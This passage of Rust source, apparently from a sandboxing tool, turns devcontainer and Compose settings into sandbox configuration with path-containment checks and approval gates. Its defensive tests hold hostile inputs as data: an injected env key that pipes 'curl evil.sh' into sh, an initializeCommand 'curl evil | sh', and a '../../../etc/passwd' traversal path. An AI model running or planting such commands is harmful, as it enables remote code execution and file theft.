        serde_yaml::Value::String(path) => references.push(resolve_compose_reference(
            config_dir,
            base_dir,
            path,
            ComposeReferenceKind::EnvFile,
            true,
        )?),
        serde_yaml::Value::Sequence(paths) => {
            for item in paths {
                if let Some(path) = item.as_str() {
                    references.push(resolve_compose_reference(
                        config_dir,
                        base_dir,
                        path,
                        ComposeReferenceKind::EnvFile,
                        true,
                    )?);
                } else if let Some(item) = item.as_mapping() {
                    let path = mapping_value(item, "path")
                        .and_then(serde_yaml::Value::as_str)
                        .ok_or_else(|| {
                            "Compose reference `env_file.path` is not a string".to_string()
                        })?;
                    let required = mapping_value(item, "required")
                        .and_then(serde_yaml::Value::as_bool)
                        .unwrap_or(true);
                    references.push(resolve_compose_reference(
                        config_dir,
                        base_dir,
                        path,
                        ComposeReferenceKind::EnvFile,
                        required,
                    )?);
                } else {
                    return Err("Compose reference `env_file` has an invalid entry".to_string());
                }
            }
        }
        _ => return Err("Compose reference `env_file` has an invalid shape".to_string()),
    }
    Ok(())
}

fn collect_build_files(
    config_dir: &Path,
    base_dir: &Path,
    value: &serde_yaml::Value,
    references: &mut Vec<ComposeReference>,
) -> Result<(), String> {
    let (context, dockerfile, inline) = if let Some(context) = value.as_str() {
        (context, None, false)
    } else if let Some(build) = value.as_mapping() {
        let context = match mapping_value(build, "context") {
            Some(context) => context
                .as_str()
                .ok_or_else(|| "Compose reference `build.context` is not a string".to_string())?,
            None => ".",
        };
        let dockerfile = mapping_value(build, "dockerfile")
            .map(|dockerfile| {
                dockerfile.as_str().ok_or_else(|| {
                    "Compose reference `build.dockerfile` is not a string".to_string()
                })
            })
            .transpose()?;
        let inline = mapping_value(build, "dockerfile_inline").is_some();
        (context, dockerfile, inline)
    } else {
        return Err("Compose reference `build.context` has an invalid shape".to_string());
    };
    let resolved_context = resolve_compose_path(config_dir, base_dir, context)?;
    if let Some(dockerfile) = dockerfile {
        let path = resolve_compose_from_base(config_dir, &resolved_context, dockerfile)?;
        references.push(resolve_compose_reference_path(
            config_dir,
            dockerfile,
            path,
            ComposeReferenceKind::Dockerfile,
            true,
        )?);
    } else if !inline {
        references.push(resolve_compose_reference_path(
            config_dir,
            "Dockerfile",
            resolved_context.join("Dockerfile"),
            ComposeReferenceKind::Dockerfile,
            false,
        )?);
    }
    Ok(())
}

fn collect_include(
    config_dir: &Path,
    base_dir: &Path,
    value: &serde_yaml::Value,
    references: &mut Vec<ComposeReference>,
) -> Result<(), String> {
    match value {
        serde_yaml::Value::String(path) => references.push(resolve_compose_reference(
            config_dir,
            base_dir,
            path,
            ComposeReferenceKind::Include,
            true,
        )?),
        serde_yaml::Value::Sequence(items) => {
            for item in items {
                if let Some(path) = item.as_str() {
                    references.push(resolve_compose_reference(
                        config_dir,
                        base_dir,
                        path,
                        ComposeReferenceKind::Include,
                        true,
                    )?);
                } else if let Some(item) = item.as_mapping() {
                    let paths = mapping_value(item, "path")
                        .ok_or_else(|| "Compose reference `include.path` is missing".to_string())?;
                    let paths = if let Some(path) = paths.as_str() {
                        vec![path]
                    } else if let Some(paths) = paths.as_sequence() {
                        paths
                            .iter()
                            .map(|path| {
                                path.as_str().ok_or_else(|| {
                                    "Compose reference `include.path` is not a string".to_string()
                                })
                            })
                            .collect::<Result<Vec<_>, _>>()?
                    } else {
                        return Err("Compose reference `include.path` has an invalid shape".into());
                    };
                    for path in paths {
                        references.push(resolve_compose_reference(
                            config_dir,
                            base_dir,
                            path,
                            ComposeReferenceKind::Include,
                            true,
                        )?);
                    }
                    if let Some(env_file) = mapping_value(item, "env_file") {
                        collect_env_files(config_dir, base_dir, env_file, references)?;
                    }
                } else {
                    return Err("Compose reference `include` has an invalid entry".into());
                }
            }
        }
        _ => return Err("Compose reference `include` has an invalid shape".into()),
    }
    Ok(())
}

fn resolve_compose_reference(
    config_dir: &Path,
    base_dir: &Path,
    reference: &str,
    kind: ComposeReferenceKind,
    required: bool,
) -> Result<ComposeReference, String> {
    let path = resolve_compose_path(config_dir, base_dir, reference)?;
    Ok(ComposeReference {
        kind,
        path,
        required,
    })
}

fn resolve_compose_reference_path(
    config_dir: &Path,
    reference: &str,
    path: PathBuf,
    kind: ComposeReferenceKind,
    required: bool,
) -> Result<ComposeReference, String> {
    validate_compose_reference(reference)?;
    let checked = check_compose_containment(config_dir, &path, reference)?;
    Ok(ComposeReference {
        kind,
        path: checked,
        required,
    })
}

fn resolve_compose_path(
    config_dir: &Path,
    base_dir: &Path,
    reference: &str,
) -> Result<PathBuf, String> {
    let root = repository_root(config_dir);
    let canonical_root = root.canonicalize().map_err(|_| {
        format!("Compose reference `{reference}` cannot verify repository containment")
    })?;
    let canonical_dir = base_dir.canonicalize().map_err(|_| {
        format!("Compose reference `{reference}` cannot verify repository containment")
    })?;
    if !canonical_dir.starts_with(&canonical_root) {
        return Err(format!(
            "Compose reference `{reference}` escapes the repository through a symlink"
        ));
    }
    resolve_compose_from_base(config_dir, &canonical_dir, reference)
}

fn validate_compose_reference(reference: &str) -> Result<(), String> {
    let refuse = |reason: &str| format!("Compose reference `{reference}` {reason}");
    if reference.contains('$') {
        return Err(refuse(
            "uses variable interpolation; thegn cannot verify it",
        ));
    }
    if reference.contains("://") || reference.starts_with("git@") {
        return Err(refuse("is a remote build context"));
    }
    if Path::new(reference).is_absolute() {
        return Err(refuse("is absolute"));
    }
    Ok(())
}

fn resolve_compose_from_base(
    config_dir: &Path,
    base: &Path,
    reference: &str,
) -> Result<PathBuf, String> {
    validate_compose_reference(reference)?;
    let refuse = |reason: &str| format!("Compose reference `{reference}` {reason}");
    let root = repository_root(config_dir).canonicalize().map_err(|_| {
        format!("Compose reference `{reference}` cannot verify repository containment")
    })?;
    let relative_dir = base
        .strip_prefix(&root)
        .map_err(|_| refuse("escapes the repository"))?;
    let reference_path = Path::new(reference);
    let mut parts: Vec<std::ffi::OsString> = relative_dir
        .components()
        .filter_map(|component| match component {
            std::path::Component::Normal(part) => Some(part.to_os_string()),
            _ => None,
        })
        .collect();
    for component in reference_path.components() {
        match component {
            std::path::Component::Normal(part) => parts.push(part.to_os_string()),
            std::path::Component::CurDir => {}
            std::path::Component::ParentDir if !parts.is_empty() => {
                parts.pop();
            }
            std::path::Component::ParentDir
            | std::path::Component::RootDir
            | std::path::Component::Prefix(_) => return Err(refuse("escapes the repository")),
        }
    }
    let resolved = parts.into_iter().fold(root, |path, part| path.join(part));
    check_compose_containment(config_dir, &resolved, reference)
}

fn check_compose_containment(
    config_dir: &Path,
    resolved: &Path,
    reference: &str,
) -> Result<PathBuf, String> {
    let root = repository_root(config_dir);
    let mut existing = resolved;
    while std::fs::symlink_metadata(existing).is_err() {
        existing = existing.parent().ok_or_else(|| {
            format!("Compose reference `{reference}` cannot verify repository containment")
        })?;
    }
    let canonical_existing = existing.canonicalize().map_err(|_| {
        format!("Compose reference `{reference}` cannot verify repository containment")
    })?;
    let canonical_root = root.canonicalize().map_err(|_| {
        format!("Compose reference `{reference}` cannot verify repository containment")
    })?;
    if !canonical_existing.starts_with(canonical_root) {
        return Err(format!(
            "Compose reference `{reference}` escapes the repository through a symlink"
        ));
    }
    Ok(resolved.to_path_buf())
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::devcontainer::parse;

    fn ctx() -> SubstCtx<'static> {
        SubstCtx {
            local_workspace_folder: "/home/u/proj".into(),
            container_workspace_folder: "/workspaces/proj".into(),
            local_env: &|_| None,
            container_env: &|_| None,
        }
    }

    #[test]
    fn default_workspace_folder() {
        assert_eq!(
            default_container_workspace_folder("/home/u/my-repo"),
            "/workspaces/my-repo"
        );
        assert_eq!(
            default_container_workspace_folder("/home/u/my-repo/"),
            "/workspaces/my-repo"
        );
    }

    #[test]
    fn image_fills_only_when_unpinned() {
        let dc = parse(r#"{ "image": "node:20" }"#).unwrap();
        let mut sb = SandboxConfig::default();
        apply_to_sandbox(&dc, &mut sb, &ctx());
        assert_eq!(sb.image, "node:20");

        // A user-pinned image wins.
        let mut sb2 = SandboxConfig {
            image: "debian:stable".into(),
            ..Default::default()
        };
        apply_to_sandbox(&dc, &mut sb2, &ctx());
        assert_eq!(sb2.image, "debian:stable");
    }

    #[test]
    fn mounts_ports_env_fold_in() {
        let dc = parse(
            r#"{
                "image": "x",
                "mounts": [
                    { "source": "/host/cache", "target": "/cache", "type": "bind" },
                    { "source": "named-vol", "target": "/data", "type": "volume" },
                    { "source": "/ro", "target": "/ro", "type": "bind", "readonly": true }
                ],
                "forwardPorts": [3000, "5432:5432"],
                "containerEnv": { "TZ": "UTC" },
                "remoteEnv": { "API": "${localWorkspaceFolder}/x" }
            }"#,
        )
        .unwrap();
        let mut sb = SandboxConfig::default();
        let warns = apply_to_sandbox(&dc, &mut sb, &ctx());
        assert!(warns.is_empty(), "unexpected warnings: {warns:?}");
        assert!(sb.mounts.contains(&"/host/cache:/cache".to_string()));
        assert!(sb.mounts.contains(&"/ro:/ro:ro".to_string()));
        assert_eq!(
            sb.volumes.get("named-vol").map(String::as_str),
            Some("/data")
        );
        assert!(sb.ports.contains(&"3000:3000".to_string()));
        assert!(sb.ports.contains(&"5432:5432".to_string()));
        // env + variable substitution landed in init_script exports.
        assert!(sb.init_script.contains("export TZ=UTC"));
        assert!(sb.init_script.contains("export API=/home/u/proj/x"));
    }

    #[test]
    fn devcontainer_volume_records_its_owner_id() {
        let mut dc =
            parse(r#"{"mounts":[{"source":"named-vol","target":"/data","type":"volume"}]}"#)
                .unwrap();
        dc.config_path = Some(std::path::PathBuf::from(
            "/repo/.devcontainer/devcontainer.json",
        ));
        let owner = devcontainer::devcontainer_id(
            Path::new("/repo"),
            Path::new(".devcontainer/devcontainer.json"),
        );
        let mut sb = SandboxConfig::default();
        fold_mounts(
            &dc,
            &mut sb,
            &ctx(),
            &|_| false,
            &mut SubstitutionReport::default(),
        );
        assert_eq!(sb.volume_owners.get("named-vol"), Some(&owner));

        let no_path =
            parse(r#"{"mounts":[{"source":"named-vol","target":"/data","type":"volume"}]}"#)
                .unwrap();
        let mut unbound = SandboxConfig::default();
        fold_mounts(
            &no_path,
            &mut unbound,
            &ctx(),
            &|_| false,
            &mut SubstitutionReport::default(),
        );
        assert!(!unbound.volume_owners.contains_key("named-vol"));
    }

    #[test]
    fn user_configured_volume_is_not_owner_bound() {
        let mut dc =
            parse(r#"{"mounts":[{"source":"named-vol","target":"/data","type":"volume"}]}"#)
                .unwrap();
        dc.config_path = Some(std::path::PathBuf::from(
            "/repo/.devcontainer/devcontainer.json",
        ));
        let mut sb = SandboxConfig {
            volumes: [("named-vol".into(), "/user-data".into())]
                .into_iter()
                .collect(),
            ..SandboxConfig::default()
        };
        fold_mounts(
            &dc,
            &mut sb,
            &ctx(),
            &|_| false,
            &mut SubstitutionReport::default(),
        );
        assert_eq!(
            sb.volumes.get("named-vol").map(String::as_str),
            Some("/user-data")
        );
        assert!(!sb.volume_owners.contains_key("named-vol"));
    }

    #[test]
    fn tmpfs_and_anonymous_mounts_warn() {
        let dc = parse(
            r#"{ "image": "x", "mounts": [
                { "target": "/t", "type": "tmpfs" },
                { "target": "/a", "type": "volume" }
            ] }"#,
        )
        .unwrap();
        let mut sb = SandboxConfig::default();
        let before = sb.mounts.len();
        let warns = apply_to_sandbox(&dc, &mut sb, &ctx());
        assert_eq!(warns.len(), 2);
        // Neither unsupported mount was added.
        assert_eq!(sb.mounts.len(), before);
    }

    #[test]
    fn poststart_and_postattach_go_to_init_script() {
        let dc = parse(
            r#"{ "image": "x",
                "postStartCommand": "start-svc",
                "postAttachCommand": ["echo", "hi there"] }"#,
        )
        .unwrap();
        let mut sb = SandboxConfig::default();
        apply_to_sandbox(&dc, &mut sb, &ctx());
        assert!(sb.init_script.contains("start-svc"));
        // argv form is shell-quoted.
        assert!(sb.init_script.contains("echo 'hi there'"));
    }

    #[test]
    fn init_script_appends_to_existing() {
        let dc = parse(r#"{ "image": "x", "postStartCommand": "svc" }"#).unwrap();
        let mut sb = SandboxConfig {
            init_script: "existing".into(),
            ..Default::default()
        };
        apply_to_sandbox(&dc, &mut sb, &ctx());
        assert!(sb.init_script.starts_with("existing"));
        assert!(sb.init_script.contains("svc"));
    }

    #[test]
    fn initialize_goes_to_prepare() {
        let dc = parse(r#"{ "image": "x", "initializeCommand": "host-setup.sh" }"#).unwrap();
        let mut sb = SandboxConfig::default();
        apply_to_sandbox(&dc, &mut sb, &ctx());
        assert_eq!(sb.prepare, vec!["host-setup.sh".to_string()]);
    }

    #[test]
    fn lifecycle_one_time_steps_ordered() {
        let dc = parse(
            r#"{ "image": "x",
                "onCreateCommand": "a",
                "updateContentCommand": ["b", "c"],
                "postCreateCommand": "d" }"#,
        )
        .unwrap();
        let steps = lifecycle_steps(&dc, "/w", &ctx());
        let ids: Vec<_> = steps.iter().map(|s| s.id.as_str()).collect();
        assert_eq!(
            ids,
            vec![
                "devcontainer.onCreate.0",
                "devcontainer.updateContent.0",
                "devcontainer.postCreate.0"
            ]
        );
        // Each cd's into the workdir.
        assert!(matches!(&steps[0].kind, StepKind::Exec(s) if s == "cd /w && a"));
        assert!(matches!(&steps[1].kind, StepKind::Exec(s) if s == "cd /w && b c"));
    }

    fn approvals_for(dc: &DevContainer) -> Approvals {
        Approvals::from_canonical(gate_requests(dc).iter().map(|r| r.canonical()))
    }

    #[test]
    fn gated_apply_denies_until_approved() {
        let dc = parse(
            r#"{ "image": "node:20", "forwardPorts": [3000],
                "postCreateCommand": "npm ci" }"#,
        )
        .unwrap();
        // Nothing approved → nothing applies, everything pends.
        let mut sb = SandboxConfig::default();
        let o = apply_gated(&dc, &mut sb, &ctx(), "/w", &Approvals::deny_all());
        assert!(sb.image.is_empty());
        assert!(o.steps.is_empty());
        let keys: Vec<_> = o.pending.iter().map(|r| r.key.as_str()).collect();
        assert!(keys.contains(&"devcontainer.image"));
        assert!(keys.contains(&"devcontainer.ports"));
        assert!(keys.contains(&"devcontainer.lifecycle"));

        // Approve all → everything applies, nothing pends.
        let mut sb2 = SandboxConfig::default();
        let o2 = apply_gated(&dc, &mut sb2, &ctx(), "/w", &approvals_for(&dc));
        assert!(o2.pending.is_empty());
        assert_eq!(sb2.image, "node:20");
        assert!(sb2.ports.contains(&"3000:3000".to_string()));
        assert_eq!(o2.steps.len(), 1);
        assert_eq!(o2.steps[0].id, "devcontainer.postCreate.0");
    }

    #[test]
    fn gated_env_applies_ungated() {
        let dc = parse(r#"{ "image": "x", "containerEnv": { "TZ": "UTC" } }"#).unwrap();
        let mut sb = SandboxConfig::default();
        // Deny everything — env still lands (literal values, no host widening).
        apply_gated(&dc, &mut sb, &ctx(), "/w", &Approvals::deny_all());
        assert!(sb.init_script.contains("export TZ=UTC"));
        assert!(sb.image.is_empty());
    }

    #[test]
    fn malicious_env_key_is_dropped_not_injected() {
        // A repo-committed env key crafted to break out of `export {k}=…` must
        // NOT reach init_script — env applies ungated, so this is the exact
        // shell-injection that would bypass the lifecycle trust gate.
        let dc = parse(
            r#"{ "image": "x", "containerEnv": {
                "TZ=UTC; curl evil.sh|sh #": "x",
                "SAFE": "ok",
                "bad key": "y",
                "1LEADINGDIGIT": "z"
            } }"#,
        )
        .unwrap();
        let mut sb = SandboxConfig::default();
        apply_gated(&dc, &mut sb, &ctx(), "/w", &Approvals::deny_all());
        // The only valid identifier lands; the injection + malformed names don't.
        assert!(sb.init_script.contains("export SAFE=ok"));
        assert!(!sb.init_script.contains("curl evil.sh"));
        assert!(!sb.init_script.contains("bad key"));
        assert!(!sb.init_script.contains("1LEADINGDIGIT"));
    }

    #[test]
    fn env_name_validation() {
        assert!(is_valid_env_name("PATH"));
        assert!(is_valid_env_name("_x9"));
        assert!(is_valid_env_name("A_B_C"));
        assert!(!is_valid_env_name(""));
        assert!(!is_valid_env_name("9x"));
        assert!(!is_valid_env_name("a b"));
        assert!(!is_valid_env_name("a=b"));
        assert!(!is_valid_env_name("a;b"));
        assert!(!is_valid_env_name("café"));
    }

    #[test]
    fn inventory_refuses_reserved_and_silently_drops_editor_keys() {
        let dc = parse(
            r#"{
                "image": "x", "privileged": true, "runArgs": ["--privileged"],
                "hostRequirements": {"cpus": 4},
                "customizations": {"vscode": {"settings": {}}}
            }"#,
        )
        .unwrap();
        let mut sb = SandboxConfig::default();
        let outcome = apply_gated(&dc, &mut sb, &ctx(), "/w", &Approvals::deny_all());
        assert!(
            outcome
                .warnings
                .iter()
                .any(|w| w.contains("privileged") && w.contains("refused"))
        );
        assert!(
            outcome
                .warnings
                .iter()
                .any(|w| w.contains("hostRequirements") && w.contains("reserved"))
        );
        assert!(
            outcome
                .warnings
                .iter()
                .all(|w| !w.contains("customizations"))
        );
    }

    #[test]
    fn local_env_policy_is_applied_to_ungated_container_env() {
        let dc = parse(r#"{"containerEnv": {"SAFE": "${localEnv:SAFE}", "NO": "${localEnv:NO}"}}"#)
            .unwrap();
        let mut sb = SandboxConfig::default();
        let outcome = apply_gated_with_policy(
            &dc,
            &mut sb,
            &ctx(),
            "/w",
            &Approvals::deny_all(),
            &|name| name == "SAFE",
        );
        assert!(
            sb.init_script.contains("export SAFE=''") || sb.init_script.contains("export SAFE=")
        );
        assert!(sb.init_script.contains("export NO=''") || sb.init_script.contains("export NO="));
        assert!(outcome.substitution.blocked_local_env.contains("NO"));
    }

    #[test]
    fn backend_honorability_names_non_oci_families() {
        let dc = parse(r#"{"image": "ubuntu:24.04"}"#).unwrap();
        assert_eq!(
            backend_honorability(&dc, BackendFamily::Oci),
            BackendHonorability::Honored
        );
        assert_eq!(
            backend_honorability(&dc, BackendFamily::Bwrap),
            BackendHonorability::Degraded(BackendFamily::Bwrap)
        );
        assert_eq!(
            backend_honorability(&dc, BackendFamily::Host),
            BackendHonorability::Degraded(BackendFamily::Host)
        );
        let empty = parse("{}").unwrap();
        assert_eq!(
            backend_honorability(&empty, BackendFamily::Oci),
            BackendHonorability::NotApplicable
        );
    }

    #[test]
    fn lifecycle_request_flags_host_execution() {
        let dc = parse(r#"{ "image": "x", "initializeCommand": "curl evil | sh" }"#).unwrap();
        let req = lifecycle_request(&dc).unwrap();
        assert!(req.summary.contains("ON HOST"));
        assert!(req.summary.contains("curl evil | sh"));
    }

    #[test]
    fn gate_key_is_stable_across_substitution_and_changes_with_content() {
        let a = parse(r#"{ "image": "node:20" }"#).unwrap();
        let b = parse(r#"{ "image": "node:22" }"#).unwrap();
        let ka = source_request(&a).unwrap().canonical();
        let kb = source_request(&b).unwrap().canonical();
        assert_ne!(ka, kb, "changing the image must re-prompt");
        assert_eq!(ka, source_request(&a).unwrap().canonical(), "stable");
    }

    fn parse_with_dir(text: &str, dir: &str) -> DevContainer {
        let mut dc = parse(text).unwrap();
        dc.config_dir = Some(std::path::PathBuf::from(dir));
        dc
    }

    #[test]
    fn build_sets_tag_and_resolved_paths() {
        let temp = tempfile::tempdir().unwrap();
        let config_dir = temp.path().join("proj").join(".devcontainer");
        std::fs::create_dir_all(&config_dir).unwrap();
        std::fs::write(config_dir.join("Dockerfile"), "FROM scratch\n").unwrap();
        let dc = parse_with_dir(
            r#"{ "build": { "dockerfile": "Dockerfile", "context": ".", "args": { "V": "20" } } }"#,
            config_dir.to_str().unwrap(),
        );
        let mut sb = SandboxConfig::default();
        let warns = apply_to_sandbox(&dc, &mut sb, &ctx());
        assert!(warns.is_empty(), "{warns:?}");
        // image is a content tag hinting the project name (parent of .devcontainer).
        assert!(sb.image.starts_with("thegn-dc-proj:"), "{}", sb.image);
        let b = sb.build.expect("build set");
        assert_eq!(
            b.dockerfile,
            config_dir.join("Dockerfile").to_string_lossy().into_owned()
        );
        assert_eq!(b.context, config_dir.to_string_lossy().into_owned());
        assert_eq!(b.args.get("V").map(String::as_str), Some("20"));
    }

    #[test]
    fn build_digest_edit_changes_image_tag() {
        let temp = tempfile::tempdir().unwrap();
        let config_dir = temp.path().join("proj").join(".devcontainer");
        std::fs::create_dir_all(&config_dir).unwrap();
        let dockerfile = config_dir.join("Dockerfile");
        std::fs::write(&dockerfile, "FROM scratch\n").unwrap();
        let dc = parse_with_dir(
            r#"{ "build": { "dockerfile": "Dockerfile", "context": "." } }"#,
            config_dir.to_str().unwrap(),
        );

        let mut first = SandboxConfig::default();
        let first_warnings = apply_to_sandbox(&dc, &mut first, &ctx());
        assert!(first_warnings.is_empty(), "{first_warnings:?}");
        let first_image = first.image;

        std::fs::write(&dockerfile, "FROM alpine:3\n").unwrap();
        let mut second = SandboxConfig::default();
        let second_warnings = apply_to_sandbox(&dc, &mut second, &ctx());
        assert!(second_warnings.is_empty(), "{second_warnings:?}");
        assert_ne!(first_image, second.image);
    }

    #[test]
    fn build_digest_unhashable_dockerfile_keeps_build_and_warns() {
        let temp = tempfile::tempdir().unwrap();
        let config_dir = temp.path().join("proj").join(".devcontainer");
        std::fs::create_dir_all(&config_dir).unwrap();
        let dc = parse_with_dir(
            r#"{ "build": { "dockerfile": "Dockerfile", "context": "." } }"#,
            config_dir.to_str().unwrap(),
        );
        let mut sb = SandboxConfig::default();
        let warns = apply_to_sandbox(&dc, &mut sb, &ctx());

        assert!(sb.build.is_some());
        assert!(sb.image.starts_with("thegn-dc-"));
        assert_eq!(warns.len(), 1, "{warns:?}");
        assert!(warns[0].contains("could not hash Dockerfile"), "{warns:?}");
        assert!(warns[0].contains("Dockerfile"), "{warns:?}");
    }

    #[test]
    fn build_context_edit_changes_image_tag() {
        let temp = tempfile::tempdir().unwrap();
        let config_dir = temp.path().join("proj").join(".devcontainer");
        std::fs::create_dir_all(&config_dir).unwrap();
        std::fs::write(config_dir.join("Dockerfile"), "FROM scratch\n").unwrap();
        let context_file = config_dir.join("ctx-file");
        std::fs::write(&context_file, "a").unwrap();
        let dc = parse_with_dir(
            r#"{ "build": { "dockerfile": "Dockerfile", "context": "." } }"#,
            config_dir.to_str().unwrap(),
        );

        let mut first = SandboxConfig::default();
        let first_warnings = apply_to_sandbox(&dc, &mut first, &ctx());
        assert!(first_warnings.is_empty(), "{first_warnings:?}");
        std::fs::write(&context_file, "b").unwrap();
        let mut second = SandboxConfig::default();
        let second_warnings = apply_to_sandbox(&dc, &mut second, &ctx());
        assert!(second_warnings.is_empty(), "{second_warnings:?}");
        assert_ne!(first.image, second.image);
    }

    #[test]
    fn build_context_over_budget_warns_and_keeps_build() {
        let temp = tempfile::tempdir().unwrap();
        let config_dir = temp.path().join("proj").join(".devcontainer");
        std::fs::create_dir_all(&config_dir).unwrap();
        std::fs::write(config_dir.join("Dockerfile"), "FROM scratch\n").unwrap();
        for index in 0..(sandbox_build::CONTEXT_DIGEST_MAX_ENTRIES + 52) {
            std::fs::write(config_dir.join(format!("file-{index}")), "").unwrap();
        }
        let dc = parse_with_dir(
            r#"{ "build": { "dockerfile": "Dockerfile", "context": "." } }"#,
            config_dir.to_str().unwrap(),
        );
        let mut sb = SandboxConfig::default();
        let warns = apply_to_sandbox(&dc, &mut sb, &ctx());

        assert!(sb.build.is_some());
        assert!(sb.image.starts_with("thegn-dc-"));
        assert_eq!(warns.len(), 1, "{warns:?}");
        assert!(
            warns[0].contains("could not digest build context"),
            "{warns:?}"
        );
    }

    #[test]
    fn explicit_image_or_build_disables_host_toolchain_injection() {
        // A devcontainer image is self-contained; thegn must not bind the
        // host `/usr`/`/bin` over it (that shadowed the image's own tools).
        let img = parse(r#"{ "image": "node:20" }"#).unwrap();
        let mut sb = SandboxConfig::default();
        assert!(sb.auto_caches, "default is on");
        apply_to_sandbox(&img, &mut sb, &ctx());
        assert!(
            !sb.auto_caches,
            "explicit image must disable host-toolchain inject"
        );

        let bld = parse_with_dir(
            r#"{ "build": { "dockerfile": "Dockerfile" } }"#,
            "/home/u/proj/.devcontainer",
        );
        let mut sb2 = SandboxConfig::default();
        apply_to_sandbox(&bld, &mut sb2, &ctx());
        assert!(!sb2.auto_caches, "build must disable host-toolchain inject");
    }

    #[test]
    fn build_absolute_paths_are_refused() {
        let dc = parse_with_dir(
            r#"{ "build": { "dockerfile": "/abs/Dockerfile", "context": "/abs" } }"#,
            "/home/u/proj/.devcontainer",
        );
        let mut sb = SandboxConfig::default();
        let warns = apply_to_sandbox(&dc, &mut sb, &ctx());
        assert!(sb.build.is_none());
        assert!(sb.image.is_empty());
        assert!(warns.iter().any(|warning| warning.contains("absolute")));
    }

    #[test]
    fn build_parent_traversal_is_refused_when_it_escapes_repository() {
        let dc = parse_with_dir(
            r#"{ "build": { "dockerfile": "../../../etc/passwd", "context": "." } }"#,
            "/home/u/proj/.devcontainer",
        );
        let mut sb = SandboxConfig::default();
        let warns = apply_to_sandbox(&dc, &mut sb, &ctx());
        assert!(sb.build.is_none());
        assert!(warns.iter().any(|warning| warning.contains("escapes")));
    }

    #[test]
    fn build_yields_to_user_pinned_image() {
        let dc = parse_with_dir(
            r#"{ "build": { "dockerfile": "Dockerfile" } }"#,
            "/home/u/proj/.devcontainer",
        );
        let mut sb = SandboxConfig {
            image: "debian:stable".into(),
            ..Default::default()
        };
        apply_to_sandbox(&dc, &mut sb, &ctx());
        assert_eq!(sb.image, "debian:stable");
        assert!(sb.build.is_none());
    }

    #[test]
    fn build_without_config_dir_warns() {
        // Bare-text parse (no dir) can't resolve the context.
        let dc = parse(r#"{ "build": { "dockerfile": "Dockerfile" } }"#).unwrap();
        let mut sb = SandboxConfig::default();
        let warns = apply_to_sandbox(&dc, &mut sb, &ctx());
        assert_eq!(warns.len(), 1);
        assert!(warns[0].contains("config dir"));
        assert!(sb.build.is_none());
    }

    #[test]
    fn build_is_trust_gated() {
        let dc = parse_with_dir(
            r#"{ "build": { "dockerfile": "Dockerfile" } }"#,
            "/home/u/proj/.devcontainer",
        );
        // Denied → no build applied, request pends under devcontainer.build.
        let mut sb = SandboxConfig::default();
        let o = apply_gated(&dc, &mut sb, &ctx(), "/w", &Approvals::deny_all());
        assert!(sb.build.is_none());
        assert!(o.pending.iter().any(|r| r.key == "devcontainer.build"));

        // Approved → build applies.
        let mut sb2 = SandboxConfig::default();
        let o2 = apply_gated(&dc, &mut sb2, &ctx(), "/w", &approvals_for(&dc));
        assert!(sb2.build.is_some());
        assert!(o2.pending.is_empty());
    }

    #[test]
    fn compose_folds_into_encoded_field() {
        let dc = parse_with_dir(
            r#"{ "dockerComposeFile": ["docker-compose.yml", "override.yml"],
                "service": "app", "runServices": ["db"] }"#,
            "/home/u/proj/.devcontainer",
        );
        let mut sb = SandboxConfig::default();
        apply_to_sandbox(&dc, &mut sb, &ctx());
        let cs = crate::sandbox_compose::ComposeSpec::decode(sb.compose.as_ref().unwrap());
        assert_eq!(
            cs.files,
            vec![
                "/home/u/proj/.devcontainer/docker-compose.yml",
                "/home/u/proj/.devcontainer/override.yml"
            ]
        );
        assert_eq!(cs.service.as_deref(), Some("app"));
        assert_eq!(cs.run_services, vec!["db"]);
    }

    #[test]
    fn compose_is_trust_gated() {
        let dc = parse_with_dir(
            r#"{ "dockerComposeFile": "c.yml", "service": "app" }"#,
            "/home/u/proj/.devcontainer",
        );
        let mut sb = SandboxConfig::default();
        let o = apply_gated(&dc, &mut sb, &ctx(), "/w", &Approvals::deny_all());
        assert!(sb.compose.is_none());
        assert!(o.pending.iter().any(|r| r.key == "devcontainer.compose"));

        let mut sb2 = SandboxConfig::default();
        apply_gated(&dc, &mut sb2, &ctx(), "/w", &approvals_for(&dc));
        assert!(sb2.compose.is_some());
    }

    #[test]
    fn compose_warns_on_mounts_and_ports() {
        let dc = parse_with_dir(
            r#"{ "dockerComposeFile": "c.yml", "service": "app", "forwardPorts": [3000] }"#,
            "/home/u/proj/.devcontainer",
        );
        let mut sb = SandboxConfig::default();
        let warns = apply_to_sandbox(&dc, &mut sb, &ctx());
        assert!(warns.iter().any(|w| w.contains("compose file")));
    }

    #[test]
    fn compose_absolute_path_is_refused() {
        let dc = parse_with_dir(
            r#"{ "dockerComposeFile": "/abs.yml", "service": "app" }"#,
            "/home/u/proj/.devcontainer",
        );
        let mut sb = SandboxConfig::default();
        let warns = apply_to_sandbox(&dc, &mut sb, &ctx());
        assert!(sb.compose.is_none());
        assert!(warns.iter().any(|warning| warning.contains("absolute")));
    }

    #[test]
    fn features_gated_and_stepped() {
        let dc = parse(
            r#"{ "image": "x", "features": { "ghcr.io/devcontainers/features/node:1": {} } }"#,
        )
        .unwrap();
        // Denied → the request pends, no steps.
        let mut sb = SandboxConfig::default();
        let o = apply_gated(&dc, &mut sb, &ctx(), "/w", &Approvals::deny_all());
        assert!(o.pending.iter().any(|r| r.key == "devcontainer.features"));
        assert!(gated_feature_steps(&dc, "root", &Approvals::deny_all()).is_empty());
        // Approved → install steps materialize.
        let steps = gated_feature_steps(&dc, "root", &approvals_for(&dc));
        assert_eq!(steps.len(), 1);
        assert_eq!(steps[0].id, "devcontainer.feature.node");
    }

    #[test]
    fn referenced_files_resolves_build_and_compose_inside_the_repo() {
        let dir = tempfile::tempdir().unwrap();
        let config_dir = dir.path().join(".devcontainer");
        std::fs::create_dir_all(&config_dir).unwrap();
        std::fs::create_dir_all(config_dir.join("docker")).unwrap();
        let build = parse(r#"{ "build": { "dockerfile": "docker/Dockerfile" } }"#).unwrap();
        assert_eq!(
            referenced_files(&build, &config_dir).unwrap(),
            vec![config_dir.join("docker/Dockerfile")]
        );
        let compose = parse(
            r#"{ "dockerComposeFile": ["compose.yml", "override.yml", "compose.yml"], "service": "app" }"#,
        )
        .unwrap();
        assert_eq!(
            referenced_files(&compose, &config_dir).unwrap(),
            vec![
                config_dir.join("compose.yml"),
                config_dir.join("override.yml")
            ]
        );
        let image = parse(r#"{ "image": "repo" }"#).unwrap();
        assert!(referenced_files(&image, &config_dir).unwrap().is_empty());
    }

    #[test]
    fn referenced_files_refuses_absolute_and_escaping_paths() {
        let dir = tempfile::tempdir().unwrap();
        let config_dir = dir.path().join(".devcontainer");
